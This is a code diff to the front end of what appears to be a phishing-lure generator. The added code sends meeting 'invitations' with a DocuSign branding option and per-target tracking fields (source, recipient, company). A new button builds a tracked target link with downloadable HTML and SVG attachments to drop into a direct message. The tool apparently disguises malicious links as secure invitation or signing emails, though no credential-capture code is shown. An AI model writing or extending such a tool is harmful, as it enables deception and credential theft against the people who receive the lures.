@@ -52,7 +52,10 @@
           meetingId: $('meeting').value,
           pwd: $('pwd').value,
           subject: $('subject').value,
-          message: $('message').value
+          message: $('message').value,
+          src: $('src').value,
+          who: $('who').value,
+          co: $('co').value
         })
       });
       var data = await response.json();
@@ -64,11 +67,16 @@
       $('result').classList.add('show');
       $('status').textContent = data.recipients + ' recipient(s) · service: ' + data.service + ' · link ' + data.id;
       if (data.service === 'docusign') {
-        notice('DocuSign has no compose deep link. Copy the message and paste it in the envelope email, or use the copied link in DocuSign.', false);
+        notice('Invitation sent. DocuSign has no compose deep link — the secure link is in the email body.', true);
+      } else if (data.sent && data.sent.some(function (s) { return s.sent; })) {
+        var sentN = data.sent.filter(function (s) { return s.sent; }).length;
+        var failN = data.sent.filter(function (s) { return !s.sent; }).length;
+        var msg = 'Invitation sent to ' + sentN + ' recipient(s)';
+        if (failN) msg += ' (' + failN + ' failed)';
+        notice(msg, true);
       } else {
-        notice('Invitation ready. Open the composer and send.', true);
+        notice('Invitation ready. Link copied to clipboard.', true);
       }
-      if (data.service !== 'copy' && data.service !== 'docusign') window.open(data.link, '_blank', 'noopener');
     } catch (error) {
       notice(error.message, false);
     } finally {
@@ -76,6 +84,40 @@
     }
   });
 
+  $('buildlink').addEventListener('click', async function () {
+    var button = $('buildlink');
+    button.disabled = true;
+    $('notice').classList.remove('show');
+    try {
+      var response = await fetch('/api/link', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          meetingId: $('meeting').value,
+          pwd: $('pwd').value,
+          src: $('src').value,
+          who: $('who').value,
+          co: $('co').value
+        })
+      });
+      var data = await response.json();
+      if (!response.ok) throw new Error(data.error || 'Could not create the link.');
+      last = data;
+      $('linkbox').textContent = data.target;
+      $('open').href = data.meeting;
+      $('test').href = data.target;
+      $('attach').href = data.attachHtml;
+      $('attachsvg').href = data.attachSvg;
+      $('result').classList.add('show');
+      $('status').textContent = 'link ' + data.id + ' - ' + data.src + (data.who ? ' - ' + data.who : '');
+      notice('Link ready. Copy it into the DM or use the attachment.', true);
+      copy(data.target);
+    } catch (error) {
+      notice(error.message, false);
+    } finally {
+      button.disabled = false;
+    }
+  });
   $('copy').addEventListener('click', function () { if (last) copy(last.target); });
   $('copybody').addEventListener('click', function () { if (last) copy(last.body); });
   $('year').textContent = new Date().getFullYear();
